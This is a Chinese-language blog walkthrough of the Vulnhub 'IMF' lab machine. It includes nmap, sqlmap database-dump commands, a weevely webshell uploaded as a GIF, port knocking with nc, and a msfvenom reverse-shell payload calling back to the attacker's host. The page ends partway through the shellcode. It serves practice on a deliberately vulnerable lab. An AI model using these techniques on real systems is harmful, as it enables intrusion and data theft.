@@ -1,0 +1,1018 @@
+<!DOCTYPE html>
+<html lang="zh-cn" dir="ltr">
+    <head><meta charset='utf-8'>
+<meta name='viewport' content='width=device-width, initial-scale=1'><meta name='description' content='Vulnhub靶机 难度：中等 信息收集 1 2 3 nmap -sV -f 192.168.100.142 靶机只开放了80段口 页面源代码，找到第一个Flag_1 echo &amp;quot;YWxsdGhlZmlsZXM=&amp;quot; | base64 -d,得到allthefil'>
+<title>IMF靶机</title>
+
+<link rel='canonical' href='http://main1o.eu.org/p/imf%E9%9D%B6%E6%9C%BA/'>
+
+<link rel="stylesheet" href="/scss/style.min.b9d3b9e1847a2abb770d14e8117e1dcb6cdae19de947eed1abc74cc7f25e5042.css"><meta property='og:title' content='IMF靶机'>
+<meta property='og:description' content='Vulnhub靶机 难度：中等 信息收集 1 2 3 nmap -sV -f 192.168.100.142 靶机只开放了80段口 页面源代码，找到第一个Flag_1 echo &amp;quot;YWxsdGhlZmlsZXM=&amp;quot; | base64 -d,得到allthefil'>
+<meta property='og:url' content='http://main1o.eu.org/p/imf%E9%9D%B6%E6%9C%BA/'>
+<meta property='og:site_name' content='main1o&#39;s Blog'>
+<meta property='og:type' content='article'><meta property='article:section' content='Post' /><meta property='article:tag' content='python' /><meta property='article:published_time' content='2022-06-24T00:00:00&#43;00:00'/><meta property='article:modified_time' content='2022-06-24T00:00:00&#43;00:00'/><meta property='og:image' content='http://main1o.eu.org/%E7%8C%AB%E7%BE%BD%E9%9B%AB.jpg' />
+<meta name="twitter:title" content="IMF靶机">
+<meta name="twitter:description" content="Vulnhub靶机 难度：中等 信息收集 1 2 3 nmap -sV -f 192.168.100.142 靶机只开放了80段口 页面源代码，找到第一个Flag_1 echo &amp;quot;YWxsdGhlZmlsZXM=&amp;quot; | base64 -d,得到allthefil"><meta name="twitter:card" content="summary_large_image">
+    <meta name="twitter:image" content='http://main1o.eu.org/%E7%8C%AB%E7%BE%BD%E9%9B%AB.jpg' />
+    <link rel="shortcut icon" href="/monv.ico" />
+
+    </head>
+    <body class="
+    article-page
+    ">
+    <script>
+        (function() {
+            const colorSchemeKey = 'StackColorScheme';
+            if(!localStorage.getItem(colorSchemeKey)){
+                localStorage.setItem(colorSchemeKey, "auto");
+            }
+        })();
+    </script><script>
+    (function() {
+        const colorSchemeKey = 'StackColorScheme';
+        const colorSchemeItem = localStorage.getItem(colorSchemeKey);
+        const supportDarkMode = window.matchMedia('(prefers-color-scheme: dark)').matches === true;
+
+        if (colorSchemeItem == 'dark' || colorSchemeItem === 'auto' && supportDarkMode) {
+            
+
+            document.documentElement.dataset.scheme = 'dark';
+        } else {
+            document.documentElement.dataset.scheme = 'light';
+        }
+    })();
+</script>
+<div class="container main-container flex on-phone--column extended"><aside class="sidebar left-sidebar sticky ">
+    <button class="hamburger hamburger--spin" type="button" id="toggle-menu" aria-label="切换菜单">
+        <span class="hamburger-box">
+            <span class="hamburger-inner"></span>
+        </span>
+    </button>
+
+    <header>
+        
+            
+            <figure class="site-avatar">
+                <a href="/">
+                
+                    
+                    
+                    
+                        
+                        <img src="/img/avatar_hu325d5c1f3011b78da0c57ed7949f30eb_773756_300x0_resize_box_3.png" width="300"
+                            height="300" class="site-logo" loading="lazy" alt="Avatar">
+                    
+                
+                </a>
+                
+                    <span class="emoji">🥳</span>
+                
+            </figure>
+            
+        
+        
+        <div class="site-meta">
+            <h1 class="site-name"><a href="/">main1o&#39;s Blog</a></h1>
+            <h2 class="site-description">🚩荆棘之路</h2>
+        </div>
+    </header><ol class="menu" id="main-menu">
+        
+        
+        
+        <li >
+            <a href='/' >
+                
+                
+                
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-home" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <polyline points="5 12 3 12 12 3 21 12 19 12" />
+  <path d="M5 12v7a2 2 0 0 0 2 2h10a2 2 0 0 0 2 -2v-7" />
+  <path d="M9 21v-6a2 2 0 0 1 2 -2h2a2 2 0 0 1 2 2v6" />
+</svg>
+
+
+
+                
+                <span>Home</span>
+            </a>
+        </li>
+        
+        
+        <li >
+            <a href='/archives/' >
+                
+                
+                
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-archive" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <rect x="3" y="4" width="18" height="4" rx="2" />
+  <path d="M5 8v10a2 2 0 0 0 2 2h10a2 2 0 0 0 2 -2v-10" />
+  <line x1="10" y1="12" x2="14" y2="12" />
+</svg>
+
+
+
+                
+                <span>Archives</span>
+            </a>
+        </li>
+        
+        
+        <li >
+            <a href='/search/' >
+                
+                
+                
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-search" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="10" cy="10" r="7" />
+  <line x1="21" y1="21" x2="15" y2="15" />
+</svg>
+
+
+
+                
+                <span>Search</span>
+            </a>
+        </li>
+        
+        
+        <li >
+            <a href='/links' >
+                
+                
+                
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-link" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <path d="M10 14a3.5 3.5 0 0 0 5 0l4 -4a3.5 3.5 0 0 0 -5 -5l-.5 .5" />
+  <path d="M14 10a3.5 3.5 0 0 0 -5 0l-4 4a3.5 3.5 0 0 0 5 5l.5 -.5" />
+</svg>
+
+
+
+                
+                <span>Links</span>
+            </a>
+        </li>
+        
+        
+        <li >
+            <a href='/about/' >
+                
+                
+                
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-user" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="12" cy="7" r="4" />
+  <path d="M6 21v-2a4 4 0 0 1 4 -4h4a4 4 0 0 1 4 4v2" />
+</svg>
+
+
+
+                
+                <span>About</span>
+            </a>
+        </li>
+        
+
+        <div class="menu-bottom-section">
+            
+            
+                <li id="dark-mode-toggle">
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-toggle-left" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="8" cy="12" r="2" />
+  <rect x="2" y="6" width="20" height="12" rx="6" />
+</svg>
+
+
+
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-toggle-right" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="16" cy="12" r="2" />
+  <rect x="2" y="6" width="20" height="12" rx="6" />
+</svg>
+
+
+
+                    <span>暗色模式</span>
+                </li>
+            
+        </div>
+    </ol>
+</aside>
+
+    
+
+            <main class="main full-width">
+    <article class="has-image main-article">
+    <header class="article-header">
+        <div class="article-image">
+            <a href="/p/imf%E9%9D%B6%E6%9C%BA/">
+                
+                    <img src="/%e7%8c%ab%e7%be%bd%e9%9b%ab.jpg" loading="lazy" alt="Featured image of post IMF靶机" />
+                
+            </a>
+        </div>
+    
+
+    <div class="article-details">
+    
+    <header class="article-category">
+        
+            <a href="/categories/%E6%9D%82%E9%A1%B9/" >
+                杂项
+            </a>
+        
+    </header>
+    
+
+    <div class="article-title-wrapper">
+        <h2 class="article-title">
+            <a href="/p/imf%E9%9D%B6%E6%9C%BA/">IMF靶机</a>
+        </h2>
+    
+        
+    </div>
+
+    
+    
+    
+    
+    <footer class="article-time">
+        
+            <div>
+                <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-calendar-time" width="56" height="56" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <path d="M11.795 21h-6.795a2 2 0 0 1 -2 -2v-12a2 2 0 0 1 2 -2h12a2 2 0 0 1 2 2v4" />
+  <circle cx="18" cy="18" r="4" />
+  <path d="M15 3v4" />
+  <path d="M7 3v4" />
+  <path d="M3 11h16" />
+  <path d="M18 16.496v1.504l1 1" />
+</svg>
+                <time class="article-time--published">2022-06-24</time>
+            </div>
+        
+
+        
+            <div>
+                <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-clock" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="12" cy="12" r="9" />
+  <polyline points="12 7 12 12 15 15" />
+</svg>
+
+
+
+                <time class="article-time--reading">
+                    阅读时长: 3 分钟
+                </time>
+            </div>
+        
+    </footer>
+    
+
+    
+</div>
+
+</header>
+
+    <section class="article-content">
+    
+    
+    <h1 id="vulnhub靶机">Vulnhub靶机</h1>
+<blockquote>
+<p>难度：中等</p>
+</blockquote>
+<p>信息收集</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">nmap -sV -f 192.168.100.142
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">靶机只开放了80段口
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><img src="/p/imf%E9%9D%B6%E6%9C%BA/image-1.png"
+	width="1613"
+	height="924"
+	srcset="/p/imf%E9%9D%B6%E6%9C%BA/image-1_huea359479e49e4d1117805572a0553473_178803_480x0_resize_box_3.png 480w, /p/imf%E9%9D%B6%E6%9C%BA/image-1_huea359479e49e4d1117805572a0553473_178803_1024x0_resize_box_3.png 1024w"
+	loading="lazy"
+	
+		alt="image-1"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="174"
+		data-flex-basis="418px"
+	
+></p>
+<p>页面源代码，找到第一个Flag_1</p>
+<p><code>echo &quot;YWxsdGhlZmlsZXM=&quot; | base64 -d</code>,得到<code>allthefiles</code></p>
+<p><img src="/p/imf%E9%9D%B6%E6%9C%BA/image-2.png"
+	width="1080"
+	height="745"
+	srcset="/p/imf%E9%9D%B6%E6%9C%BA/image-2_hu0a9c787f4a9e65c1b4c59a37e63aed5f_47346_480x0_resize_box_3.png 480w, /p/imf%E9%9D%B6%E6%9C%BA/image-2_hu0a9c787f4a9e65c1b4c59a37e63aed5f_47346_1024x0_resize_box_3.png 1024w"
+	loading="lazy"
+	
+		alt="image-2"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="144"
+		data-flex-basis="347px"
+	
+></p>
+<p>文件名疑似Base64, 拼凑解码</p>
+<p><code>echo &quot;ZmxhZzJ7YVcxbVlXUnRhVzVwYzNSeVlYUnZjZz09fQ==&quot; | base64 -d </code></p>
+<p><code>flag2{aW1mYWRtaW5pc3RyYXRvcg==}</code></p>
+<p>再解一下得到<code>imfadministrator</code> ， imf 的admin登录地址，访问</p>
+<p><img src="/p/imf%E9%9D%B6%E6%9C%BA/image-20220519091108594.png"
+	width="735"
+	height="397"
+	srcset="/p/imf%E9%9D%B6%E6%9C%BA/image-20220519091108594_hu5a8a7d9765c4767548a4e7d1da966666_19379_480x0_resize_box_3.png 480w, /p/imf%E9%9D%B6%E6%9C%BA/image-20220519091108594_hu5a8a7d9765c4767548a4e7d1da966666_19379_1024x0_resize_box_3.png 1024w"
+	loading="lazy"
+	
+		alt="image-20220519091108594"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="185"
+		data-flex-basis="444px"
+	
+></p>
+<p>页面提示，没有使用SQL，密码被编码了 (似乎在页面有一个叫&rsquo;Roger&rsquo;&hellip;)</p>
+<p><img src="/p/imf%E9%9D%B6%E6%9C%BA/image-20220519091527826.png"
+	width="485"
+	height="174"
+	srcset="/p/imf%E9%9D%B6%E6%9C%BA/image-20220519091527826_hu401af29ee5d3ad6346ec6a1e8ab68455_8472_480x0_resize_box_3.png 480w, /p/imf%E9%9D%B6%E6%9C%BA/image-20220519091527826_hu401af29ee5d3ad6346ec6a1e8ab68455_8472_1024x0_resize_box_3.png 1024w"
+	loading="lazy"
+	
+		alt="image-20220519091527826"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="278"
+		data-flex-basis="668px"
+	
+></p>
+<p><img src="/p/imf%E9%9D%B6%E6%9C%BA/image-20220519091533225.png"
+	width="826"
+	height="256"
+	srcset="/p/imf%E9%9D%B6%E6%9C%BA/image-20220519091533225_hu70ecdc7c41c082a372659b0af3cdf734_19737_480x0_resize_box_3.png 480w, /p/imf%E9%9D%B6%E6%9C%BA/image-20220519091533225_hu70ecdc7c41c082a372659b0af3cdf734_19737_1024x0_resize_box_3.png 1024w"
+	loading="lazy"
+	
+		alt="image-20220519091533225"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="322"
+		data-flex-basis="774px"
+	
+></p>
+<p>在首页的登录页面下也是有3个用户提示</p>
+<p><img src="/p/imf%E9%9D%B6%E6%9C%BA/image-20220519091844321.png"
+	width="1496"
+	height="1026"
+	srcset="/p/imf%E9%9D%B6%E6%9C%BA/image-20220519091844321_hucb105ad0715b2adb4d08bba9f5a6c0e9_183679_480x0_resize_box_3.png 480w, /p/imf%E9%9D%B6%E6%9C%BA/image-20220519091844321_hucb105ad0715b2adb4d08bba9f5a6c0e9_183679_1024x0_resize_box_3.png 1024w"
+	loading="lazy"
+	
+		alt="image-20220519091844321"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="145"
+		data-flex-basis="349px"
+	
+></p>
+<p>挨个测试,rmichaels 是可以登录的，就是没有密码</p>
+<blockquote>
+<p>通过之前的提示知道密码被编码的，那肯定要进行比较，猜测使用strcmp()函数进行对比</p>
+<p>密码相等的话返回0。如果字符串和数组比较也是会返回0</p>
+</blockquote>
+<p><img src="/p/imf%E9%9D%B6%E6%9C%BA/image-20220519092035881.png"
+	width="455"
+	height="262"
+	srcset="/p/imf%E9%9D%B6%E6%9C%BA/image-20220519092035881_hu647923ddb2f14e407af83e83a08581d7_10408_480x0_resize_box_3.png 480w, /p/imf%E9%9D%B6%E6%9C%BA/image-20220519092035881_hu647923ddb2f14e407af83e83a08581d7_10408_1024x0_resize_box_3.png 1024w"
+	loading="lazy"
+	
+		alt="image-20220519092035881"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="173"
+		data-flex-basis="416px"
+	
+></p>
+<p>抓包，传入数组测试。绕过成功</p>
+<p><code>Flag3{Y29udGludWVUT2Ntcw==}</code>解码continueTOcms</p>
+<p><img src="/p/imf%E9%9D%B6%E6%9C%BA/image-20220519095226905.png"
+	width="947"
+	height="584"
+	srcset="/p/imf%E9%9D%B6%E6%9C%BA/image-20220519095226905_hu9ee7d87c15b4c914f8367be5b7887524_47014_480x0_resize_box_3.png 480w, /p/imf%E9%9D%B6%E6%9C%BA/image-20220519095226905_hu9ee7d87c15b4c914f8367be5b7887524_47014_1024x0_resize_box_3.png 1024w"
+	loading="lazy"
+	
+		alt="image-20220519095226905"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="162"
+		data-flex-basis="389px"
+	
+></p>
+<p><img src="/p/imf%E9%9D%B6%E6%9C%BA/image-20220519095300905.png"
+	width="612"
+	height="242"
+	srcset="/p/imf%E9%9D%B6%E6%9C%BA/image-20220519095300905_hu4a3b392eb941e8e890398ebbdeb960a2_17113_480x0_resize_box_3.png 480w, /p/imf%E9%9D%B6%E6%9C%BA/image-20220519095300905_hu4a3b392eb941e8e890398ebbdeb960a2_17113_1024x0_resize_box_3.png 1024w"
+	loading="lazy"
+	
+		alt="image-20220519095300905"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="252"
+		data-flex-basis="606px"
+	
+></p>
+<p>登录成功后，发现啥都没有</p>
+<p><img src="/p/imf%E9%9D%B6%E6%9C%BA/image-20220519095628340.png"
+	width="1158"
+	height="685"
+	srcset="/p/imf%E9%9D%B6%E6%9C%BA/image-20220519095628340_hu954fb333047a875a704ced7c680d0fdf_204777_480x0_resize_box_3.png 480w, /p/imf%E9%9D%B6%E6%9C%BA/image-20220519095628340_hu954fb333047a875a704ced7c680d0fdf_204777_1024x0_resize_box_3.png 1024w"
+	loading="lazy"
+	
+		alt="image-20220519095628340"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="169"
+		data-flex-basis="405px"
+	
+></p>
+<p>尝试爆破二级目录。</p>
+<p><img src="/p/imf%E9%9D%B6%E6%9C%BA/image-20220519101035359.png"
+	width="773"
+	height="464"
+	srcset="/p/imf%E9%9D%B6%E6%9C%BA/image-20220519101035359_hub6cce45d2e29b888ddd8db0dac2d2ec2_203612_480x0_resize_box_3.png 480w, /p/imf%E9%9D%B6%E6%9C%BA/image-20220519101035359_hub6cce45d2e29b888ddd8db0dac2d2ec2_203612_1024x0_resize_box_3.png 1024w"
+	loading="lazy"
+	
+		alt="image-20220519101035359"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="166"
+		data-flex-basis="399px"
+	
+></p>
+<p>有文件上传的目录，但是没有上传点</p>
+<p>Url是可以传参的，试试sqlmap</p>
+<p><img src="/p/imf%E9%9D%B6%E6%9C%BA/image-20220519101435073.png"
+	width="863"
+	height="373"
+	srcset="/p/imf%E9%9D%B6%E6%9C%BA/image-20220519101435073_hu79a4a68d1760f491f32b903fa82bdda1_71251_480x0_resize_box_3.png 480w, /p/imf%E9%9D%B6%E6%9C%BA/image-20220519101435073_hu79a4a68d1760f491f32b903fa82bdda1_71251_1024x0_resize_box_3.png 1024w"
+	loading="lazy"
+	
+		alt="image-20220519101435073"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="231"
+		data-flex-basis="555px"
+	
+></p>
+<p><code>sqlmap -u &quot;http://192.168.100.142/imfadministrator/cms.php?pagename=disavowlist&quot; --dbs --batch --cookie=&quot;PHPSESSID=fb579gndjr8b3m9hojis09o3r6&quot;</code></p>
+<p>得到数据库，测试admin数据库下的唯一表 pages</p>
+<p><img src="/p/imf%E9%9D%B6%E6%9C%BA/image-20220519101642745.png"
+	width="542"
+	height="189"
+	srcset="/p/imf%E9%9D%B6%E6%9C%BA/image-20220519101642745_hu200a9470a831cb6a9b72fa63233ed920_86643_480x0_resize_box_3.png 480w, /p/imf%E9%9D%B6%E6%9C%BA/image-20220519101642745_hu200a9470a831cb6a9b72fa63233ed920_86643_1024x0_resize_box_3.png 1024w"
+	loading="lazy"
+	
+		alt="image-20220519101642745"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="286"
+		data-flex-basis="688px"
+	
+></p>
+<p><code>sqlmap -u &quot;http://192.168.100.142/imfadministrator/cms.php?pagename=disavowlist&quot;  --batch --cookie=&quot;PHPSESSID=fb579gndjr8b3m9hojis09o3r6&quot; -D admin  -T pages --dump</code></p>
+<p><img src="/p/imf%E9%9D%B6%E6%9C%BA/image-20220519102234579.png"
+	width="1252"
+	height="417"
+	srcset="/p/imf%E9%9D%B6%E6%9C%BA/image-20220519102234579_hu9b412726d0df76a6ce98a4d238f0db09_398261_480x0_resize_box_3.png 480w, /p/imf%E9%9D%B6%E6%9C%BA/image-20220519102234579_hu9b412726d0df76a6ce98a4d238f0db09_398261_1024x0_resize_box_3.png 1024w"
+	loading="lazy"
+	
+		alt="image-20220519102234579"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="300"
+		data-flex-basis="720px"
+	
+></p>
+<p>访问得知，有一个图片，扫描得到<code>Flag4{dXBsb2Fkcjk0Mi5waHA=}</code>解码得<code>uploadr942.php</code></p>
+<p><img src="/p/imf%E9%9D%B6%E6%9C%BA/image-20220519102401957.png"
+	width="1182"
+	height="756"
+	srcset="/p/imf%E9%9D%B6%E6%9C%BA/image-20220519102401957_hu761ef47d34dc6e09e42e048ad9f8dd62_315973_480x0_resize_box_3.png 480w, /p/imf%E9%9D%B6%E6%9C%BA/image-20220519102401957_hu761ef47d34dc6e09e42e048ad9f8dd62_315973_1024x0_resize_box_3.png 1024w"
+	loading="lazy"
+	
+		alt="image-20220519102401957"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="156"
+		data-flex-basis="375px"
+	
+></p>
+<p><img src="/p/imf%E9%9D%B6%E6%9C%BA/image-20220519102442082.png"
+	width="531"
+	height="671"
+	srcset="/p/imf%E9%9D%B6%E6%9C%BA/image-20220519102442082_huaaa436227df5eb54c126b7f28a9252f7_90113_480x0_resize_box_3.png 480w, /p/imf%E9%9D%B6%E6%9C%BA/image-20220519102442082_huaaa436227df5eb54c126b7f28a9252f7_90113_1024x0_resize_box_3.png 1024w"
+	loading="lazy"
+	
+		alt="image-20220519102442082"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="79"
+		data-flex-basis="189px"
+	
+></p>
+<p>访问上传页面目测只能上传图片，并且通过文件头和末尾判断，有htaccess文件</p>
+<p>使用weevely生成木马 带密码的</p>
+<p><code>weevely generate 1234 shell.php</code></p>
+<p>在头部添加进行绕过,源码有提示得文件名</p>
+<p><img src="/p/imf%E9%9D%B6%E6%9C%BA/image-20220519104116909.png"
+	width="1132"
+	height="825"
+	srcset="/p/imf%E9%9D%B6%E6%9C%BA/image-20220519104116909_hu1d1f9b4bdf33b37d0eed273cdceeb997_58022_480x0_resize_box_3.png 480w, /p/imf%E9%9D%B6%E6%9C%BA/image-20220519104116909_hu1d1f9b4bdf33b37d0eed273cdceeb997_58022_1024x0_resize_box_3.png 1024w"
+	loading="lazy"
+	
+		alt="image-20220519104116909"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="137"
+		data-flex-basis="329px"
+	
+></p>
+<p><img src="/p/imf%E9%9D%B6%E6%9C%BA/image-20220519104126619.png"
+	width="686"
+	height="377"
+	srcset="/p/imf%E9%9D%B6%E6%9C%BA/image-20220519104126619_huba07b4ae6b0d55cc97435dd15d65a1b5_19322_480x0_resize_box_3.png 480w, /p/imf%E9%9D%B6%E6%9C%BA/image-20220519104126619_huba07b4ae6b0d55cc97435dd15d65a1b5_19322_1024x0_resize_box_3.png 1024w"
+	loading="lazy"
+	
+		alt="image-20220519104126619"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="181"
+		data-flex-basis="436px"
+	
+></p>
+<p>连接木马</p>
+<p><code>weevely http://192.168.100.142/imfadministrator/uploads/8cf3502f3c52.gif  1234</code></p>
+<p>查看Flag5_abc123def.txt</p>
+<p><img src="/p/imf%E9%9D%B6%E6%9C%BA/image-20220518205524441.png"
+	width="873"
+	height="461"
+	srcset="/p/imf%E9%9D%B6%E6%9C%BA/image-20220518205524441_hu5c34177960d4eed13caf61ad5de80d4f_400818_480x0_resize_box_3.png 480w, /p/imf%E9%9D%B6%E6%9C%BA/image-20220518205524441_hu5c34177960d4eed13caf61ad5de80d4f_400818_1024x0_resize_box_3.png 1024w"
+	loading="lazy"
+	
+		alt="image-20220518205524441"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="189"
+		data-flex-basis="454px"
+	
+></p>
+<p>得到提示<code>echo &quot;YWdlbnRzZXJ2aWNlcw==&quot; | base64 -d</code>, 还运行着一个叫agent的服务</p>
+<p><img src="/p/imf%E9%9D%B6%E6%9C%BA/image-20220518205243414.png"
+	width="585"
+	height="110"
+	srcset="/p/imf%E9%9D%B6%E6%9C%BA/image-20220518205243414_hu9cb80bd87c3b5fd4e54e6f93e1833b0b_58619_480x0_resize_box_3.png 480w, /p/imf%E9%9D%B6%E6%9C%BA/image-20220518205243414_hu9cb80bd87c3b5fd4e54e6f93e1833b0b_58619_1024x0_resize_box_3.png 1024w"
+	loading="lazy"
+	
+		alt="image-20220518205243414"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="531"
+		data-flex-basis="1276px"
+	
+></p>
+<p>查看同级目录下的文件，接入的端口7482 8279 9467</p>
+<p><img src="/p/imf%E9%9D%B6%E6%9C%BA/image-20220518205852903.png"
+	width="532"
+	height="322"
+	srcset="/p/imf%E9%9D%B6%E6%9C%BA/image-20220518205852903_huf9bf1c8220aa8750902be9dc9751b5bc_158348_480x0_resize_box_3.png 480w, /p/imf%E9%9D%B6%E6%9C%BA/image-20220518205852903_huf9bf1c8220aa8750902be9dc9751b5bc_158348_1024x0_resize_box_3.png 1024w"
+	loading="lazy"
+	
+		alt="image-20220518205852903"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="165"
+		data-flex-basis="396px"
+	
+></p>
+<p>对于Agent这个程序的分析</p>
+<blockquote>
+<p><a class="link" href="https://g0blin.co.uk/imf-vulnhub-writeup/"  target="_blank" rel="noopener"
+    >g0blin Research: IMF VulnHub Writeup</a></p>
+<p><a class="link" href="https://www.icode9.com/content-4-893866.html"  target="_blank" rel="noopener"
+    >OSCP IMF </a></p>
+</blockquote>
+<p>得知要进行端口敲门，才能进行访问代理的端口</p>
+<blockquote>
+<p><a class="link" href="https://zhuanlan.zhihu.com/p/382577136"  target="_blank" rel="noopener"
+    >端口保护从端口敲门到单包授权</a></p>
+</blockquote>
+<p>方法一：</p>
+<p>下载工具<code>git clone https://github.com/grongor/knock.git</code></p>
+<p>在KALI进行端口敲门测试&hellip;</p>
+<p><img src="/p/imf%E9%9D%B6%E6%9C%BA/image-20220518210544021.png"
+	width="675"
+	height="311"
+	srcset="/p/imf%E9%9D%B6%E6%9C%BA/image-20220518210544021_hu8fd9b31e3ad76d7219d75af32856cd04_179622_480x0_resize_box_3.png 480w, /p/imf%E9%9D%B6%E6%9C%BA/image-20220518210544021_hu8fd9b31e3ad76d7219d75af32856cd04_179622_1024x0_resize_box_3.png 1024w"
+	loading="lazy"
+	
+		alt="image-20220518210544021"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="217"
+		data-flex-basis="520px"
+	
+></p>
+<p>方法二：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">使用nc依此对3个端口进行连接，即发送SYN数据包
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">nc -nv 192.168.100.142 <span class="m">7482</span> <span class="p">&amp;</span> 
+</span></span><span class="line"><span class="cl">nc -nv 192.168.100.142 <span class="m">8279</span> <span class="p">&amp;</span> 
+</span></span><span class="line"><span class="cl">nc -nv 192.168.100.142 <span class="m">9467</span> <span class="p">&amp;</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>方法三：</p>
+<p>使用 <code>Scapy</code>工具或者Python的<code>Scapy.all</code>模块发送SYN数据包</p>
+<p>对外开放了一个7788端口</p>
+<p><img src="/p/imf%E9%9D%B6%E6%9C%BA/image-20220519112551731.png"
+	width="523"
+	height="172"
+	srcset="/p/imf%E9%9D%B6%E6%9C%BA/image-20220519112551731_hu62530c49ef86fd074ff6449bc8fce953_64571_480x0_resize_box_3.png 480w, /p/imf%E9%9D%B6%E6%9C%BA/image-20220519112551731_hu62530c49ef86fd074ff6449bc8fce953_64571_1024x0_resize_box_3.png 1024w"
+	loading="lazy"
+	
+		alt="image-20220519112551731"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="304"
+		data-flex-basis="729px"
+	
+></p>
+<p><img src="/p/imf%E9%9D%B6%E6%9C%BA/image-20220518210702319.png"
+	width="921"
+	height="270"
+	srcset="/p/imf%E9%9D%B6%E6%9C%BA/image-20220518210702319_hubeb036de457c2b08fea4a6d604f6a2d0_269138_480x0_resize_box_3.png 480w, /p/imf%E9%9D%B6%E6%9C%BA/image-20220518210702319_hubeb036de457c2b08fea4a6d604f6a2d0_269138_1024x0_resize_box_3.png 1024w"
+	loading="lazy"
+	
+		alt="image-20220518210702319"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="341"
+		data-flex-basis="818px"
+	
+></p>
+<p>分析Agent知道需要进行溢出</p>
+<p>生成ShellCode，溢出拿到权限</p>
+<p><code>msfvenom -p linux/x86/shell_reverse_tcp lhost=192.168.100.101 lport=8877 -f python -b &quot;\x00\x0a\x0d&quot;</code></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
+</span><span class="lnt">8
+</span><span class="lnt">9
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="nv">buf</span> <span class="o">=</span>  b<span class="s2">&#34;&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="nv">buf</span> <span class="o">+=</span> b<span class="s2">&#34;\xba\x74\x40\x7e\xaf\xda\xd6\xd9\x74\x24\xf4\x58\x29&#34;</span>
